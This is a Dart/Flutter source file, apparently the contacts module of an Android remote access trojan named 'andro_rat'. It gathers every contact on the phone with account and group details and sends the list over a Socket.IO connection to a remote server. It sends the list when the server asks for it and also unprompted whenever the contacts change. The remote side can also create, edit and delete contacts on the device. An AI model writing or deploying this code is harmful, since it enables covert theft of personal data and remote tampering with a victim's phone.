import 'package:flutter_contacts/flutter_contacts.dart';
import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

class DeviceContacts {
  static const String remoteTrigger = "deviceContacts";
  late SocketIO.Socket _socket;

  /// Cannot invoke update, delete operations on any of the
  /// instances retrieved from this call, because photos and thumbnails aren't loaded along.
  /// This is on purpose in order to minimize payload sent to the server.
  ///
  /// To update, delete contacts, use any of the find methods here first - which makes sure all data are loaded in advance.
  Future<Map?> getPayload({ String? upon }) async {
    final payload = <String, dynamic> { "upon": upon ?? "request" };
    if (await _checkPoint()) {
      final List<Contact> cards = await FlutterContacts.getContacts(
          withProperties: true,
          withAccounts: true,
          withGroups: true,
      );
      payload.addAll({ "people": cards });
    } else {
      payload.addAll({ "error": "Permission denied" });
    }
    return payload;
  }

  Future<bool> _checkPoint() async {
    // return await FlutterContacts.requestPermission();
    return await Permission.contacts.isGranted || await Permission.contacts.request().isGranted;
  }

  Future<Contact?> create(Map<String, dynamic> map) async {
    if (await _checkPoint()) {
      final contact = Contact.fromJson(map);
      return await contact.insert();
    }
    return null;
  }

  Future<Contact?> findById(String id) async {
    if (await _checkPoint()) {
      return await FlutterContacts.getContact(
          id,
          withAccounts: true,
          withGroups: true,
      );
    }
    return null;
  }

  Future<Contact?> update(Contact card) async {
    return await _checkPoint()
        ? await card.update()
        : null;
  }

  Future<void> delete(Contact card) async {
    return await _checkPoint()
        ? await card.delete()
        : null;
  }

  void registerEvents(SocketIO.Socket socket) {
    _socket = socket;

    _socket.on(remoteTrigger, (_) async {
      sendPayload();
    });

    _socket.on("addContact", (req) async {
      var card = await create(req.card);
      // sendPayload(changeTrigger, await get()); // No need - automatically triggered
    });

    _socket.on("editContact", (req) async {
      var card = await findById(req.card.id);
      if (card == null) {
      } else {
        delete(card);
      }
      create(req.card);
      // sendPayload(changeTrigger, await get()); // No need - automatically triggered
    });

    _socket.on("delContact", (req) async {
      var card = await findById(req.card.id);
      if (card == null) {
      } else {
        delete(card);
      }
      // sendPayload(changeTrigger, await get()); // No need - automatically triggered
    });

    _initListeners();
  }

  void _initListeners() {
    FlutterContacts.addListener(() async {
      Debug.log("Contacts database updated. Sending payload...");
      sendPayload(upon: "update");
    });
  }

  void _sendPayload(String remoteTrigger, payload) {
    _socket.emit(remoteTrigger, payload);
  }

  Future<void> sendPayload({ String? upon }) async {
    Debug.log("[Sending Contacts]:");
    _sendPayload(remoteTrigger, await getPayload(upon: upon) );
    Debug.log(":[End Sending Contacts]");
  }

}
